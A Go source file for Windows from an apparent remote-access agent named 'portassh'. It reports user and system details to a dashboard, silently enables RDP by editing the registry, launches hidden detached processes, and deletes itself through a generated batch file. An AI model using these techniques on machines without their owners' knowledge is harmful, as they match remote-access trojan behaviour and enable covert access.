//go:build windows

package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/charmap"
	"golang.org/x/text/transform"
)

// enableRDPIfNeeded: в админском (elevated) режиме включаем RDP-хост,
// если порт 3389 не слушается и fDenyTSConnections=1.
func enableRDPIfNeeded(rdpPort int) {
	if rdpPort != 3389 {
		return
	}
	conn, err := net.DialTimeout("tcp", "127.0.0.1:3389", time.Second)
	if err == nil {
		conn.Close()
		return // уже слушается
	}
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Terminal Server`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Print("rdp: ", err)
		return
	}
	defer k.Close()
	cur, _, _ := k.GetIntegerValue("fDenyTSConnections")
	if cur == 0 {
		return
	}
	if err := k.SetDWordValue("fDenyTSConnections", 0); err != nil {
		log.Print("rdp: включение не удалось: ", err)
		return
	}
	log.Print("rdp: RDP включён (fDenyTSConnections 1 -> 0) — форвард 3389 теперь работает")
}

// Телеметрия для heartbeat (расширенная строка реестра).
func nativeUsername() string {
	return os.Getenv("USERDOMAIN") + "\\" + os.Getenv("USERNAME")
}

func nativeOSVersion() string {
	if v := windows.RtlGetVersion(); v != nil {
		return fmt.Sprintf("%d.%d.%d", v.MajorVersion, v.MinorVersion, v.BuildNumber)
	}
	return ""
}

func nativeFreeDiskGB() int {
	drive := os.Getenv("SystemDrive")
	if drive == "" {
		drive = "C:"
	}
	root, err := windows.UTF16PtrFromString(drive + "\\")
	if err != nil {
		return -1
	}
	var free, total uint64
	if err := windows.GetDiskFreeSpaceEx(root, &free, &total, new(uint64)); err != nil {
		return -1
	}
	return int(free / (1 << 30))
}

// setCmdLine sets the raw command line of the child process without Go's
// MSVCRT argument escaping — the only reliable way to pass quoting through
// to cmd. HideWindow: the child console never flashes (the parent is windowsgui).
func setCmdLine(cmd *exec.Cmd, line string) {
	cmd.SysProcAttr = &syscall.SysProcAttr{CmdLine: line, HideWindow: true}
}

// oemDecoder converts cmd/powershell output from the OEM codepage (CP866 on
// Russian Windows) to UTF-8. Unconditional CP866: verified against the live
// tunnel byte-for-byte. Trade-off: tools emitting UTF-8 natively get decoded
// twice — acceptable for the target fleet.
func oemDecoder() transform.Transformer {
	return charmap.CodePage866.NewDecoder()
}

// selfCleanAndExit: полное удаление portassh с машины. Артефакты — сразу,
// сам exe и лог — отложенным батником (файлы заняты до выхода процесса).
func selfCleanAndExit() {
	if c := activeClient.Load(); c != nil {
		sendOffline(c) // машина сразу исчезает с дашборда
	}
	exe, err := os.Executable()
	if err != nil {
		os.Exit(0)
	}
	dir := filepath.Dir(exe)
	for _, name := range []string{
		"portassh_port.txt", "portassh_ver.txt",
		"portassh_connection.txt", "portassh_connection_admin.txt",
		exe + ".old", exe + ".new",
	} {
		_ = os.Remove(filepath.Join(dir, name))
	}
	bat := filepath.Join(dir, "portassh_cleanup.bat")
	script := "@echo off\r\n" +
		"ping 127.0.0.1 -n 3 >nul\r\n" +
		"del /f /q \"" + exe + "\"\r\n" +
		"del /f /q \"" + filepath.Join(dir, "portassh.log") + "\"\r\n" +
		"del /f /q \"" + bat + "\"\r\n"
	_ = os.WriteFile(bat, []byte(script), 0o600)
	cmd := exec.Command("cmd.exe")
	setCmdLine(cmd, `cmd /d /c "`+bat+`"`)
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}
	cmd.SysProcAttr.CreationFlags |= 0x00000008 | 0x00000200
	cmd.SysProcAttr.HideWindow = true
	_ = cmd.Start()
	log.Print("uninstall: cleanup scheduled, exiting")
	os.Exit(0)
}

// startDetached запускает процесс, переживающий завершение родителя
// (и не держащий консоль/канал SSH-сессии).
func startDetached(cmd *exec.Cmd) error {
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}
	cmd.SysProcAttr.CreationFlags |= 0x00000008 | 0x00000200 // DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
	cmd.SysProcAttr.HideWindow = true
	return cmd.Start()
}
